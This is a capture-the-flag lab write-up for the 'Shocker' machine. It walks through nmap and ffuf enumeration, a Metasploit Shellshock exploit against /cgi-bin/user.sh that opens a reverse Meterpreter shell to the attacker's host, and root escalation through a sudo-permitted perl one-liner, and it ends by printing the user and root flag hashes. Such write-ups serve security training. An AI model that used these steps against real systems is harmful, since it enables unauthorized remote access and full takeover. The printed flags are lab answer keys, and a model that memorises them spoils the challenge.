# Writeup shocker

## Scan

```bash
# Nmap 7.92 scan initiated Sat Dec 10 16:26:08 2022 as: nmap -Pn -p 80,2222 -A -sVC -T5 -v -oN fullnamp.txt 10.129.32.215
Nmap scan report for 10.129.32.215
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.001 days (since Sat Dec 10 16:24:59 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   155.54 ms 10.10.14.1
2   155.59 ms 10.129.32.215

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 10 16:26:27 2022 -- 1 IP address (1 host up) scanned in 19.06 seconds
```

## Enumeration

> Enumeration 1 - Find "cgi-bin"  

```bash
ffuf -u http://10.129.32.215/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.32.215/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

cgi-bin                 [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 156ms]
icons                   [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 157ms]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 157ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 157ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 157ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 155ms]
:: Progress: [62284/62284] :: Job [1/1] :: 257 req/sec :: Duration: [0:04:06] :: Errors: 3 ::
```

> Enumeration 2 - Find "user.sh"

```bash
ffuf -u http://10.129.32.215/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .sh -t 100 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.32.215/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Extensions       : .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

user.sh                 [Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 169ms]
                        [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 157ms]
                        [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 161ms]
                        [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 155ms]
:: Progress: [124568/124568] :: Job [1/1] :: 643 req/sec :: Duration: [0:03:17] :: Errors: 6 ::
```

## Exploitation

**Vulnerability: ShellShock**

    A ShellShock Vulnerability was found in "/cgi-bin/user.sh".  So we go to use this to get  RCE via metasploit. But it's possible to do this manually.

    For manual exploitation follow the link --> [Exploiting Shellshock Manually](https://www.sevenlayers.com/index.php/125-exploiting-shellshock)

> Metasploit Config

```bash
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.32.215
rhost => 10.129.32.215
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost tun0
lhost => tun0
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.14.27:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (989032 bytes) to 10.129.32.215
[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.129.32.215:59012 ) at 2022-12-10 16:50:32 -0500

meterpreter > shell
```

    Once you get the shell, get the user flag.

> User Flag

```bash
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/sh")'
$ cd /home/shelly
$ cat user.txt
72440deb188ce98dd6ec90d0f6e73d14
```

## Privilege Escalation

    With the user flag obtained, we can use PERL available in "sudo -l" to get the root shell.

> Command: sudo -l

```bash
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

> Perl Privesc avaiable in --> https://gtfobins.github.io/gtfobins/perl/#sudo

```bash
$ sudo perl -e 'exec "/bin/sh";'
```

> Root Flag 

```bash
$ sudo perl -e 'exec "/bin/sh";'
# cd /root
# ls
# cat root.txt
d65b4b56356f49768fc1278974faf4a3
```


